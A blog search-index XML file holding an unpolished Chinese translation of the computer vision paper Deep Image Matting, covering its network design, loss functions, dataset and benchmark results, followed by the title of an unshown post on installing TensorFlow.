<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[深度抠图 Deep Image Matting 译文]]></title>
    <url>%2F2019%2F03%2F13%2F%E6%B7%B1%E5%BA%A6%E6%8A%A0%E5%9B%BE_DeepImageMatting%2F</url>
    <content type="text"><![CDATA[本文是 Adobe 等机构的论文 Deep Image Matting 译文。因为是初稿，如有错误及不当之处，烦请指正。 深度抠图Ning Xu1,2, Brain Price3, Scott Cohen3, and Thomas Huang1,2 1Beckman Institute for Advanced Science and Technology 2University of Illinois at Urbana-Champaign 3Adobe Research {ningxu2, t-huang1}@illinois.edu, {bprice, scohen}@adobe.com 摘要抠图是一个基本的计算机视觉问题，并且拥有广阔的应用空间。但当图像的前景和背景颜色或复杂纹理类似时，早先的算法表现的差强人意。主要时因为：1. 只有低层次特征（low-level features）；2. 缺乏高层次上下文图镜（high-level context）。本文中，我们提出了一种基于深度学习的新算法，该算法可以解决这两个问题。我们的深度模型分为两个阶段：第一个阶段是深度卷积编码-解码网络（deep convolutional encoder=decoder network），该神经网络将图像和对应的三分图（trimap）作为输入，并预测图像的 α 蒙版（α matte）；第二阶段是一个小型卷积神经网络，该神经网络对第一个网络预测的 α 蒙版进行精炼从而拥有更准确的 α 值和锐化边缘。另外，我们还创建了一个大规模抠图数据集（large-scale image matting dataset），该数据集包含 49300 张训练图像和 1000 张测试图像。我们在抠图基准、测试数据集和各种真是图像上评估了我们的算法。实验结果清楚的表明了我们的算法比先前的方法更具优越性。 1. 简介抠图是图像或视频中准确的前景估计问题，具有重要的现实意义。它是图像编辑和电影制作的关键技术，高效的自然图像抠图方法能极大地提升当前的图像视频处理流程的效率。并且这种技术是无约束场景（unconstrained scenes）下处理真实世界图像的必要方法。 不幸的是，目前的抠图方法无法很好的推广到典型的日常场景。这在一定程度上是由于问题的难度：抠图问题是欠约束的，在每个像素上有 7 个未知值却仅有 3 个已知值：$$I_i = α_iF_i + (1 - α_i)B_i \quad α_i∈[0, 1] \quad \ \ \ \ \ \ (1)$$其中 $I_i​$ 是像素 $i​$ 的 RGB 色彩，已知前景色 $F_i​$ ，未知的背景色 $B_i​$ 和蒙版估计（matte estimation）$α_i​$ 。然而，目前的方法在其方法中进一步受到限制。 第一个限制是目前用来求解抠图方程式（matting equation）的方法存在问题。 这个方程将抠图问题表述为两种颜色的线性组合，因此目前大多数算法都将其作为颜色问题来处理。标准方法包括采样前景色和背景色 [3,9] ，根据抠图方程 [14,31,22] 或者两者的混合 [32,13,28,16] 传播 $α$ 值。这种方法很大程度上依赖于颜色作为区别特征（通常与像素的空间位置一起），使得它们对前景和背景颜色分布重叠的情况非常敏感，对于这个方法不幸的是，自然图像的常见情况，根据方法的不同，往往导致低频“smearing”或高频“chunky”伪影（参见图 1 的顶行）。即使是最近提出的深度学习方法也高度依赖于颜色相关的传播方法[8,29]。 ​ 图像 三分图 Closed-form Ours 图 1. 我们的方法和 Close-form Matting[22]之间 的比较第一张图来自 Alpha Matting 基准，第二 张图片来自我们的 1000 张测试图像 第二个限制是由于专注于非常小的数据集。一般用于抠图的数据真值（ground truth）是很复杂的，而 alphamatting.com 数据集 [25] 通过提供标记数据集（ground-truth）对抠图研究做出了很重要的贡献。不过因为该数据集只由 27 张训练图像和 8 张测试图像组成，其中大部分是监视器上图像前面的对象。由于其大小和数据集的约束（例如：室内实验室场景，室内照明，没有人类或动物），它本质上是有偏见的，并且为了发布的目的激励和方法适合这些数据。与所有数据集（尤其是小数据集）的情况一样，某些时候，方法将过拟合数据集，不再能推广到真是场景。最近拥有 3 个训练视频和 10 个测试视频的视频抠图数据集[10] ，其中 5 个是从绿屏画面中提取的，其余的是使用类似的方法[25]。 在这项工作中，我们提供了一种旨在客服这些局限型的方法。我们的方法是使用深度学习在给定输入图像和三分图的基础上直接计算 α 蒙版（alpha matte）。我们的神经网络并不首要依赖于色彩信息，它会学习图像的自然结构，并将其反映到 α 蒙版中。例如头发和毛皮（通常需要将其抠出来）就拥有很强的结构和纹理图案。以及其他需要抠图的情况（例如：物体的边缘、光学或运动模糊的区域、或者半透明区域）通常存在能抽取出的公用结构体或 $α​$ 蒙版轮廓。并且由于低层次的特征并不会捕获这些结构，那么就需要深度神经网络取表征它们了。我们的两阶段神经网络包含了编码器-解码器阶段和使用小型残差网络进行精炼阶段，并且包含除了 $α​$ 损失之外的新的（组合损失ompositional loss）。我们是第一个证明了在给定输入图像和三分图的情况下能采用端到端的方式学习到 $α​$ 蒙版。 为了训练一个在无约束场景的自然图像中表现优异的模型，我们需要一个比现有更大的数据集。使用 [25] 的方法获得数据真值（ground truth）数据集是非常昂贵的，并且无法处理任何程度的运动场景（因此无法捕获人类或动物）。相反，受其他合成数据集已被证明足以训练模型用于真实图像的启发（例如：[4]），我们使用合成方法构建了一个大规模的抠图数据集。仔细提取具有简单背景图片上的对象并将其合成为具有新的背景的图像以创建具有 49300 个训练图像和 1000 个测试图像的数据集。 我们进行了广泛的评估，以证明我们的方法的有效性。我们的方法不仅在 alphamatting.com 挑战中获得第一名，而且我们在合成测试集上的表现也大大超过了先前的方法。我们与用户展示并研究了我们的学习模型概况（generalizes）到自然图像的情况并与先前的许多方法在 31 种不同场景、不同照明并以人类、动物和其他物体为特色的自然图像中的表现做了对比。研究显示更偏向于我们的结果，但同时也表明，与人类判断的的其他方法相比，某些在 alphamatting.com 数据集上表现良好的方法实际上表现的更差，这表明这些方法在 alphamatting.com 数据集上是过拟合的。最后，还展示出对 trimap 的放置比其他方法更强大。实际上，即使 trimap 种没有已知的前景和/或背景，我们也可以得到很好的结果，而大多数方法都不能返回任何结果（参见图 1）。 2. 相关工作目前的抠图方法主要依靠颜色以及位置或其他低层次特征来确定 $α​$ 蒙版（alpha matte）。它们通过采样、传播或两者的组合来实现。 基于采样的方法 [3,9,32,13,28,16] 中，对已知的前景和背景区域采样来找到对于给定像素的前景和背景候选颜色，然后使用度量（metric）来确定最佳前景/背景组合。使用不同的采样方法，包括距离给定像素最近的边界进行采样 [32] ，基于射线铸造（ray casting）的采样 [13] ，搜索整个边界 [16] ，或从颜色簇（color clusters）采样 [28,12] 。在采样候选项中确定度量（metric）几乎总是包含一个抠图方程式重构误差（matting equation reconstruction error），可能由于测量样本与给定像素的距离 [32,16] 或者前景和背景样本的相似性 [32,28] ，以及包括稀疏编码 [12] 和 KL-divergence （KL-发散）方法 [19,18] 。像纹理 [27] 等高阶特征已经很少使用，并且效果有限。 在传播方法中，方程 1 重新配置，使其允许 $α$ 值从已知的前景和背景区域传播（propagation）到未知区域。流行的方法是使用通常作为采样后的后处理 [32,16,28] 的 Close-form 抠图 [22] 。它从前景和背景颜色的局部平滑度假设推导出一个成本函数，并通过求解稀疏线性系统方程组找到全局最优的 $α$ 蒙版（alpha matte）。其他的传播方法包括随机游走（random walks）[14] ，求解泊松方程（Poisson equation）[31] 和非本地传播方法（nolocal propagation methods）[21,7,5] 。 近年来，人们提出了一些深度学习方法来解决抠图问题。然而，不能直接从给定图像和三分图中学习其 $α$ 蒙版（alpha matte）。Shen 等人 [29] 使用深度学习创建肖像图中人物的三分图，并使用 [22] 进行抠图，将抠图误差（error）反向传播到网络中。Cho 等人[8] 采用 [22] 和 [5] 的抠图结果，将 RGB 颜色归一化为输入，并训练一个端到端的深度网络来预测新的 $α$ 蒙版（alpha matte）。虽然我们的算法和这两个项目都利用了深度学习，但我们的算法与它们的算法完全不同。我们的算法直接学习给定从给定图像和三分图直接学习对应的 $α$ 蒙版（alpha matte）而另外两个项目依赖于现存的算法来计算实际的抠图问题，使得他们的方法容易出现和以前的抠图方法同样的问题。 图 2. 数据集的创建。 (a) 包含简单背景的手动抠图的 输入图像， (b) 计算 alpha 蒙版和 (c) 计算的前景色用作 数据真值用来将对象合成到 (d-f) 各种背景图上。 3. 新的抠图数据集alphamatting.com [25] 上的抠图基准在推动抠图研究的进步方面取得了巨大的成功。然而，由于获取数据真值（ground truth）图像需要细心控制的设置，此数据集仅由 27 张训练图像和 8 张测试图像构成。这不仅不足以训练神经网络，而且其多样性受到严重限制，仅限于具有静态物体的小规模实验室场景。 为了训练我们的抠图网络，我们通过将真实图像中的对象合成到新的背景来创建更大的数据集。我们在简单的背景上找到图像（图 2. a），包括来自 [25] 的 27 个训练图像和来自 [26] 的视频的每五个帧。使用 PhotoShop 我们手动创建了 $α$ 蒙版（alpha matte）（图 2. b）和纯前景色（图 2. c）。因为这些对象具有简单的背景，所以我们可以为他们提供准确的蒙版。然后我们将这些作为基本的数据真值（ground truth），对于每个 $α$ 蒙版和前景图像，我们在 MS COCO [23] 和 Pascal VOC [11] 中随机抽取 N 个背景图像，并将对象合成到这些背景图像上。 我们使用上述方法创建了训练数据集和测试数据集。我们的训练数据集拥有 493 个独特的前景对象和 49300 个图像（N = 100），而我们的测试数据集有 50 个独立对象和 1000 个图像（N = 20）。每个图像的三分图从其真实的 $α​$ 蒙版中随机扩展而成。与之前的抠图数据集相比，我们的新数据集有以下几个优点：1) 它拥有更多的独特的对象，并涵盖各种抠图的情况，如毛发、毛皮、半透明度等。2) 许多合成图像具有相似的前景色和背景色以及复杂的背景纹理，使我们的数据集更具有挑战性和使用性。 一个早期的问题是，由于图像的合成性质，这个过程是否会产生偏差，因此网络应学会关注前景和背景亮度、噪声水平等的差异。然而，我们通过实验发现，与现有方法相比，我们在自然图像上获得了更好的结果（见 5.3 节）。 4. 我们的方法我们使用深度学习来解决抠图问题。鉴于我们的新数据集，我们训练一个神经网络以充分利用数据。该网络有两个阶段组成（图 3）。第一阶段是深度卷积编码-解码器网络，它采用图像小块（image patch）和三分图作为输入，==并且因为 $α$ 预测损失和新的（组合损失compositional loss）而有不利之处。==第二阶段是一个小的全卷积网络，它以更准确的 alpha 值和更清晰的边缘完善了第一个网络的 alpha 预测。我们将在以下各节中详细描述我们的算法。 图 3. 我们的网络包含两个阶段，一个是编码器-解码器阶段（4.1节），一个是精炼阶段（4.2节） 4.1. 抠图编码器-解码器阶段（Matting encoder-decoder stage）我们的第一阶段是一个深度编码-解码器网络（参见图 3.），它在许多其他计算机视觉任务中取得了成功，例如图像分割 [2]，边缘预测[33]和孔填充（hole filling）[24]。 网络结构（Network structure）： 网络的输入时一个图像小块和相应的三分图，它们沿着通道维度连接，产生 4 通道输入。整个网络由编码器网络和解码器网络组成。通过后续卷积层和最大池化层将编码器网络的输入转化为下采样特征图。解码器网络一次使用后续的反池化层来反转最大池化操作和卷积层来对特征映射进行上采样，并具有所需的输出，在我们的例子中是 alpha 蒙版。具体来说，我们的编码器网络有 14 个卷积层和 5 个最大池化层。对于解码器网络，我们使用比编码器网络更小的结构来减少参数数量并加快训练过程。具体来说，我们的解码器网络有 6 个卷积层，5 个反卷积层，后面是最终的 alpha 预测层。 损失（Losses）： 我们的网络利用了两次损失。第一个损失称为 alpha 预测损失（alpha-prediction loss），即数据真值 alpha 值与每个像素的预测 alpha 值之间的绝对差值。但是，由于绝对值的不可微分性，我们使用以下损失函数来近似它。$$\mathcal{L}_α^i = \sqrt{(α_p^i-α_g^i)^2 + \epsilon^2} ，\ \ \ \ α_p^i,α_g^i \in [0,1] \ \ \ \ (2)$$其中 $α_p^i​$ 是预测层在阈值化为 0 到 1 之间的像素 $i​$ 处的输出。$\alpha_g^i​$ 是像素 ​$i​$ 数据真值的 alpha 值。$\epsilon​$ 是一个很小的值，在我们的实验中等于 $10^{-6}​$ 。导数 ​$\frac{\partial \mathcal{L}_\alpha^i}{\partial \alpha_p^i}​$ 是简单的。$$\frac{\partial \mathcal{L}_\alpha^i}{\partial \alpha_p^i} = \frac{α_p^i-α_g^i}{\sqrt{(α_p^i-α_g^i)^2 + \epsilon^2}} \ \ \ \ \ (3)$$第二个损失被称为组合损失（compositional loss），它是数据真值的 RGB 颜色和由数据真值前景、背景和合成的 alpha 蒙版预测的 RGB 颜色之间的绝对差值。同样，我们可以使用以下损失函数来近似它。$$\mathcal{L}_c^i = \sqrt{(c_p^i - c_g^i)^2 + \epsilon^2} \ \ \ \ \ (4)$$其中 $c$ 表示 RGB 通道，$p$ 表示由预测的 alpha 合成的图像，$g$ 表示由数据真值 alpha 构成的图像。组合损失（compositional loss）限制网络遵循组合操作（compositional operation），使得 alpha 预测更加准确。 总损失是两个损失的加权求和，即 $\mathcal{L}_overall = {w_l} \cdot {\mathcal{L}_\alpha} + (1 - w_l) \cdot {\mathcal{L}_c}​$ ，其中 $w_l​$ 在我们的实验中设置为 0.5 。此外，因为只需要推断三分图未知区域的 alpha 值，所以我们根据像素位置对两种类型的损失设置额外的权重，这可以帮助我们的网络更注重于重要区域。具体地，如果像素 $i​$ 在三分图的未知区域内，则 $w_i = 1​$ ，否则 $w_i = 0​$ 。 实现（Implementation）： 虽然我们的训练数据集有 49300 个图像，但只有 493 个唯一对象。为了避免过拟合以及更有效的利用训练数据，我们使用了一些训练策略。首先，我们以未知区域中的像素为中心随机裁剪为 $320\times320 \ (image, trimap)​$ 。这增加了我们的采样空间。其次，我们还裁剪了不同尺寸的训练对（例如：$480\times480 , 640\times640​$）并将其调整为 $320\times320​$ 。这使得我们的方法在扩展方面更加健壮，并有助于网络更好的学习上下文和语义。第三，在每个训练对上随机进行翻转（flipping）。第四，三分图从它们的数据真值 alpha 蒙版（ground truth alpha mattes）中随机扩张，帮助我们的模型对三分图的放置（placement）更稳健。最后，在每个训练周期结束后随机重建训练输入。 网络的编码器部分是用 VGG-16 [30] 的前 14 个卷积层初始化的（第 14 层是全连接层 “fc6” ，可以转换为卷积层）由于网络具有 4 通道输入，我们用全零初始化第一层卷积滤波器的一个额外通道。所有解码器参数都用 Xavier 随机初始化。 测试时，图像和相应的三分图作为输入串联。执行网络的前向传播以输出 alpha 蒙版预测。当 GPU 内存不足以容纳大图像时，可以执行 CPU 测试。 4.2. 抠图细化阶段（Matting refinement stage）：尽管来自我们网络第一部分的 alpha 预测已经比现有的抠图算法好得多，但由于编码器-解码器结构，结果有时过于平滑。因此，我们扩展我们的网络以进一步完善第一部分的结果。这种扩展的网络通常可以预测更准确的 alpha 蒙版和更清晰的边缘。 网络结构（Network structure）： 我们网络的第二阶段的输入是图像小块（image patch）与第一阶段的 alpha 预测（在 0 到 255 之间缩放）的串联，从而产生四通道输入。输出是相应的相应的数据真值（ground truth）的 alpha 蒙版。该网络是一个完全卷积网络，包括 4 个卷积层。前三个卷积层中的每个后面是非线性 ReLU 层。没有下采样层，因为我们希望保留第一阶段中非常细微的结构。此外，我们使用了 ”skip-model“ 结构，其中输入数据的第 4 个通道首先在 0 到 1 之间缩放（scaled），然后在网络的输出上添加。详细配置如图 3 所示。 我们的细化阶段的效果如图 4 所示。注意，它不会对 alpha 蒙版进行大规模更改，而只是细化和锐化 alpha 值。 ​ (a) (b) (c) 图 4. 我们抠图细化网络的影响。(a) 输入图像。(b) 编码器-解码器阶段结果。(c) 抠图细化层结果。 实现（Implementation）： 在训练期间，我们首先更新编码器-解码器部分而不使用细化部分。在编码器-解码器部分收敛之后，我们修复其参数，然后更新细化部分。由于其结构简单，仅使用 alpha 预测损失（方程2）。除第 4 阶段外，我们还使用了第 1 阶段的所有训练策略。在细化部分也收敛之后，最后我们一起微调整个网络。我们使用 Adam [20] 来更新这两个部分。较小的学习率 $10^{-5}​$ 在训练过程中不断被设置。 测试时，输入图像和对应的三分图，我们的算法首先使用抠图网络的编码器-解码器阶段来获得初始的 alpha 蒙版预测。然后将图像和 alpha 蒙版预测连接作为细化阶段的输入以产生最终的 alpha 蒙版预测。 5. 实验结果在本节，我们将在 3 个数据集上评估我们的方法。1）在抠图方法的现有基准 alphamatting.com 数据集 [25] 上评估。它包括 8 个测试图像，每个图像有 3 个不同的三分图，即 “small” 、”large” 和 “user” 。2）由于 alphamatting.com 数据集中对象的大小和范围有限，我们建议使用 Composition-1k 测试集。我们基于 Composition 的数据集包含 1000 张图像和 50 个独特的前景。此数据集具有更广泛的对象类型和背景场景。3）为了测试我们的方法在自然图像上的表现，我们还收集了包括 31 个自然图像的第三个数据集。自然图像涵盖了广泛的常见抠图前景，比如人、动物等。 Methods SAD MSE Gradient Connectivity Shared Matting [13] 128.9 0.091 126.5 135.3 Learning Based Matting [34] 113.9 0.048 91.6 122.2 Comprehensive Sampling [28] 143.8 0.071 102.2 142.7 Global Matting [16] 133.6 0.068 97.6 133.3 Closed-Form Matting [22] 168.1 0.091 126.9 167.9 KNN Matting [5] 175.4 0.103 124.1 176.4 DCNN Matting [8] 161.4 0.087 115.1 161.9 ———— —– —– ——– ———— Encoder-Decoder network (single alpha prediction loss) 59.6 0.019 40.5 59.3 Encoder-Decoder network 54.6 0.017 36.7 55.3 Encoder-Decoder network + Guided filter[17] 52.2 0.016 30.0 52.6 Encoder-Decoder network + Refinement network 50.4 0.014 31.0 50.8 表 1. Composition-1k 测试数据集的定量结果。我么的方法的变体以斜体强调。最佳的结果以粗体强调。 5.1. alphamatting.com 数据集与 alphamatting.com 基准测试中的所有其他方法相比，我们的方法取得了最佳结果。具体来说，我们的方法在 SAD 指标方面排名第一。对于具有 3 个三分图的 5 个图像（图 5.），我们的方法也具有最小的 SAD 误差。此外，我们的方法在 MSE 和 Gradient 指标方面排名第二。总的来说，我们的方法是该数据集中表现最佳的方法之一。 我们成功的一个关键原因是我们的网络学习结构和语义的能力，这对于在背景场景复杂或背景和前景色相似时准确估计 alpha 蒙版非常重要。例如，在图 6 中，”Troll” 实例具有非常相似的头发和桥的颜色，而 “Doll” 实例具有强烈的纹理背景。以前方法的最佳结果（从第 3 列到第 6 列）在这些硬区域都有明显的错误。相比之下，我们的方法直接学习对象结构和图像上下文。因此，我们的方法不仅避免了以前方法所犯的类似错误，而且还预测了更过细节。值得注意的时，虽然 DCNN matting [8] 也是一种基于深度学习的方法，它学习了小型局部先前具有小型局部补丁的抠图方法的分线性组合（it learns the non-linear combination of previous matting methods within small local patches）。因此，该方法不能真正理解语义，因此具有与先前的非基于深度学习的方法相同的限制。 图 5. alphamatting.com 数据集上的 SAD 结果。展示了前五个方法。我们的方法用红框强调。 ​ ​ Troll Ours Local-Sampling[6] TSPS-RV[1] CSC[12] DCNN[8] ​ ) ​ Doll Ours DCNN[8] LNSP[7] KL-Divergence[19] Iterative[15] 图 6. 测试图像的alpha蒙版预测，其中”Troll“三分图为”user“，”Doll“三分图为”small“。第一列显示测试图像。对于每个测试图像，从第２列到第６列显示了在SAD度量下的第一名到第五名。在两个例子中，我们的方法都时最佳结果。 5.2. Composition-1k 测试数据集我们在 Composition-1k 测试数据集上进一步评估了 7 种先前表现最佳的方法和我们方法的每个组成部分。对于先前的方法，使用作者提供的代码。我们方法的不同变体包括：抠图编码器-解码器网络 1）只有 alpha 预测损失，2）包含 alpha 预测损失和组合损失（compositional loss），抠图编码器-解码器网络 3）由 Guided filter[17] 后处理（post-processed）和 4）抠图细化网络（matting refinement network）后处理。==！！== [25] 中提出的 SAD，MSE，Gradient 和 Connectivity 误差下的定量结果显示在表 1 中。显然我们方法的所有变体都比其他方法有更好的结果。主要原因仍然是我们的深度模型能够理解图像的复杂背景，而其他方法则无法理解。通过比较我们方法的变体，我们还可以验证我们方法的每个组成部分的有效性：1）组合损失（compositional loss）有助于我们的模型学习组合操作（compositional operation），从而产生更好的结果，2）通过与先前的 edge-preserving filter（例如：Guided filter[17]）以及我们的抠图细化网络相结合，可以改善我们的抠图编码器-解码器网络的结果。但是，后者在视觉上和数量上都有更明显的改进，因为它直接用我们的编码器-解码器网络的输出进行训练。 我们在图 7 中测试了我们的方法对三分图放置（placement）的灵敏度。我们对数据集的一个子集进行评估，其中包括每个唯一对象的一个随机选择的图像，总共 50 个图像。为了形成三分图，我们将每个图像的数据真值（ground truth）alpha扩展 $d$ 个像素以增加 $d$ 的值。特定参数 $d$ 处的 SAD 误差是在所有图像上的平均。参数 $d\in[1,4,7,10,13,16,19]$ 的所有方法的结果如图 7 所示。显然，我们的方法具有低且稳定的错误率，随着 $d$ 值的增加，而其他方法的错误率迅速增加。我们的良好表现源于我们的训练策略以及对图像语义的良好理解。 图 7. 不同水平三分图扩张的 SAD 误差。 图 8 显示了一些可见的例子，表明我们的方法在不同的抠图情况下的良好表现，如头发、洞和半透明。此外，我们的方法还可以处理没有纯前景像素的对象，如图 8 中的最后一个实例所示。由于先前基于采样和基于传播的方法必须利用已知的前景和背景像素，因此它们无法处理这种情况，而我们的方法可以直接从数据中学习精细细节的外观。 图 8. Compositional-1k 测试数据集的视觉比较结果。“Ours-raw”表明了我们的抠图编码器-解码器阶段的结果，而“Ours-refined”表明了我们的精细化阶段的结果。 5.3. 真实图像数据集抠图方法应该能够很好的扩展到真实世界的图像。为了验证我们的方法和其他方法在真实图像上的性能我们对真实图像数据集进行了用户研究。这些图像包括从互联网上提取的图像以及 ICCV 2013 教程中关于抠图的图像。 因为我们的受试者可能不熟悉 alpha 蒙版，所以我们改为评估组合物的结果。对于每种方法，计算的 alpha 蒙版用于混合测试图像到黑色背景上和白色背景上。对于用户测试，我们向用户呈现图像和两个随机选择的方法的两个合成结果，并询问那些结果更准确和更真实，尤其是在精细细节的区域（例如头发、对象的边缘和半透明区域）。为了避免评估误差，我们在 Amazon Mechanical Turk 上进行用户研究。结果，共有 392 个用户参与用户研究，并且一个图像上的每个方法对由 5 到 6 个唯一用户评估。 成对比较结果显示在表 2 中，其中，每列显示一种优于其他方法的方法。例如，用户 83.7% 的时间更喜欢我们的结果对于 [13] 。值得注意的是，近五分之四的用户更喜欢我们的方法超过现有的方法，这很好地证明了我们的方法确实产生了更好的视觉效果。有关视觉效果，参见图 9 。 图 9. 我们的真实图像数据集的示例结果。 Methods [13] [34] [28] [16] [22] [5] [8] Ours Shared [13] - 60.0 78.5 79.6 69.7 40.6 57.8 83.7 Learning [34] 40.0 - 60.2 54.6 53.4 27.3 35.1 83.6 Comprehensive [28] 21.5 39.8 - 25.8 43.3 20.4 29.2 78.8 Global [16] 20.4 45.4 74.2 - 53.3 30.0 42.0 84.2 Closed-Form[22] 30.3 46.6 56.7 46.7 - 25.0 38.1 80.4 KNN[5] 59.4 72.7 79.6 70.0 75.0 - 73.3 97.0 DCNN [8] 42.2 64.9 70.8 58.0 61.9 26.7 - 83.7 Ours 16.3 16.4 21.2 15.8 19.6 3.0 16.3 - 同样值得注意的是，与其他两种实验相比，本实验中的其他方法的排名不同。例如，Closed-Form Matting [22] 是我们在 alphamatting.com 数据集上比较的方法中排名最低的，但对用户来说，它比除我们和 [28] 的其他所有方法更可取。另一方面，尽管 DCNN [8] 是先前在 alphamatting.com 上最先进的方法，但在真实图像上仅优于两种方法。目前还不清楚这究竟是由于方法过度拟合了 alphamatting.com 数据集，还是标准错误指标未能准确衡量人类对 alpha 蒙版结果的感知判断。 6. 结论为了推广到自然图像，抠图算法必须避免使用颜色作为抠图的主要依据，并利用更多的结构和语义特征。在这项工作中，我们展示了神经网络能够捕获这样的高阶特征并应用它们来计算更好的抠图结果。我们的实验表明，我们的方法不仅优于标准数据集上的先前的方法，而且能够更好的推广到真实图像。 参考文献 [1] A. Al-Kabbany and E. Dubois. Matting with sequential pair selection using graph transduction. In 21st International Symposium on Vision, Modeling, and Visualization, 2016. 6 [2] V. Badrinarayanan, A. Handa, and R. Cipolla. Segnet: A deep convolutional encoder-decoder architecture for robust semantic pixel-wise labelling. arXiv preprint arXiv:1505.07293, 2015. 3 [3] A. Berman, A. Dadourian, and P. Vlahos. Method for removing from an image the background surrounding a selected object, Oct. 17 2000. US Patent 6,134,346. 1, 2 [4] D. J. Butler, J. Wulff, G. B. Stanley, and M. J. Black. A naturalistic open source movie for optical flow evaluation. In Proceedings of the European Conference on Computer Vision, 2012. 2 [5] Q. Chen, D. Li, and C.-K. Tang. Knn matting. IEEE transactions on pattern analysis and machine intelligence, 35(9):2175–2188, 2013. 2, 5, 7, 8 [6] X. Chen and F. He. A propagation matting method based on the local sampling and knn classification with adaptive feature space. Journal of Computer-Aided Design and Computer Graphics, 2016. 6 [7] X. Chen, D. Zou, S. Zhiying Zhou, Q. Zhao, and P. Tan. Image matting with local and nonlocal smooth priors. In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, pages 1902–1907, 2013. 2, 6 [8] D. Cho, Y.-W. Tai, I. Kweon, D. Cho, Y.-W. Tai, and I. Kweon. Natural image matting using deep convolutional neural networks. In Proceedings of the European Conference on Computer Vision, 2016. 1, 2, 5, 6, 7, 8 [9] Y.-Y. Chuang, B. Curless, D. H. Salesin, and R. Szeliski. A bayesian approach to digital matting. In Computer Vision and Pattern Recognition, 2001. CVPR 2001. Proceedings of the 2001 IEEE Computer Society Conference on, volume 2, pages II–264. IEEE, 2001. 1, 2 [10] M. Erofeev, Y. Gitman, D. Vatolin, A. Fedorov, and J. Wang. Perceptually motivated benchmark for video matting. In Proceedings of the British Machine Vision Conference (BMVC), 2015. 1 [11] M. Everingham, L. Van Gool, C. K. Williams, J. Winn, and A. Zisserman. The pascal visual object classes (voc) challenge. International journal of computer vision, 88(2):303– 338, 2010. 3 [12] X. Feng, X. Liang, and Z. Zhang. A cluster sampling method for image matting via sparse coding. In European Conference on Computer Vision, pages 204–219. Springer, 2016. 2, 6 [13] E. S. Gastal and M. M. Oliveira. Shared sampling for realtime alpha matting. In Computer Graphics Forum, volume 29, pages 575–584. Wiley Online Library, 2010. 1, 2, 5, 7, 8 [14] L. Grady, T. Schiwietz, S. Aharon, and R. Westermann. Random walks for interactive alpha-matting. In Proceedings of VIIP, volume 2005, pages 423–429, 2005. 1, 2 [15] B. He, G. Wang, C. Shi, X. Yin, B. Liu, and X. Lin. Iterative transductive learning for alpha matting. In 2013 IEEE International Conference on Image Processing, pages 4282– 4286. IEEE, 2013. 6 [16] K. He, C. Rhemann, C. Rother, X. Tang, and J. Sun. A global sampling method for alpha matting. In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, 2011. 1, 2, 5, 7, 8 [17] K. He, J. Sun, and X. Tang. Guided image filtering. In European conference on computer vision, pages 1–14. Springer, 2010. 5, 6 [18] J. Johnson, E. S. Varnousfaderani, H. Cholakkal, , and D. Rajan. Sparse coding for alpha matting. IEEE Transactions on Image Processing, 2016. 2 [19] L. Karacan, A. Erdem, and E. Erdem. Image matting with kl-divergence based sparse sampling. In Proceedings of the IEEE International Conference on Computer Vision, pages 424–432, 2015. 2, 6 [20] D. Kingma and J. Ba. Adam: A method for stochastic optimization. International Conference on Learning Representations, 2015. 5 [21] P. Lee and Y. Wu. Nonlocal matting. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, 2011. 2 [22] A. Levin, D. Lischinski, and Y. Weiss. A closed-form solution to natural image matting. IEEE Transactions on Pattern Analysis and Machine Intelligence, 30(2):228–242, 2008. 1, 2, 5, 7, 8 [23] T.-Y. Lin, M. Maire, S. Belongie, J. Hays, P. Perona, D. Ramanan, P. Dollar, and C. L. Zitnick. Microsoft coco: Com-´ mon objects in context. In European Conference on Computer Vision, pages 740–755. Springer, 2014. 3 [24] D. Pathak, P. Krahenbuhl, J. Donahue, T. Darrell, and A. A. Efros. Context encoders: Feature learning by inpainting. In The IEEE Conference on Computer Vision and Pattern Recognition (CVPR), June 2016. 3 [25] C. Rhemann, C. Rother, J. Wang, M. Gelautz, P. Kohli, and P. Rott. A perceptually motivated online benchmark for image matting. In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, 2009. 1, 2, 3, 5, 6 [26] E. Shahrian, B. Price, S. Cohen, and D. Rajan. Temporally coherent and spatially accurate video matting. In Proceedings of Eurographics, 2012. 3 [27] E. Shahrian and D. Rajan. Weighted color and texture sample selection for image matting. In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, 2012. 2 [28] E. Shahrian, D. Rajan, B. Price, and S. Cohen. Improving image matting using comprehensive sampling sets. In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, pages 636–643, 2013. 1, 2, 5, 7, 8 [29] X. Shen, X. Tao, H. Gao, C. Zhou, and J. Jia. Deep automatic portrait matting. In Proceedings of the European Conference on Computer Vision, 2016. 1, 2 [30] K. Simonyan and A. Zisserman. Very deep convolutional networks for large-scale image recognition. CoRR, abs/1409.1556, 2014. 4 [31] J. Sun, J. Jia, C.-K. Tang, and H.-Y. Shum. Poisson matting. In ACM Transactions on Graphics (ToG), volume 23, pages 315–321. ACM, 2004. 1, 2 [32] J. Wang and M. F. Cohen. Optimized color sampling for robust matting. In 2007 IEEE Conference on Computer Vision and Pattern Recognition, pages 1–8. IEEE, 2007. 1, 2 [33] J. Yang, B. Price, S. Cohen, H. Lee, and M.-H. Yang. Object contour detection with a fully convolutional encoder-decoder network. Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, 2016. 3 [34] Y. Zheng and C. Kambhamettu. Learning based digital matting. In 2009 IEEE 12th International Conference on Computer Vision, pages 889–896. IEEE, 2009. 5, 7, 8 由于单个图片排版叫繁琐，方便起见直接从原论文截取图片，见谅。后面会研究下怎么能比较好的排版。]]></content>
      <categories>
        <category>译文</category>
        <category>CV</category>
      </categories>
      <tags>
        <tag>深度抠图</tag>
        <tag>论文</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows 10 安装 TensorFlow]]></title>
    <url>%2F2019%2F03%2F03%2FWindows-10-%E5%AE%89%E8%A3%85-TensorFlow%2F</url>
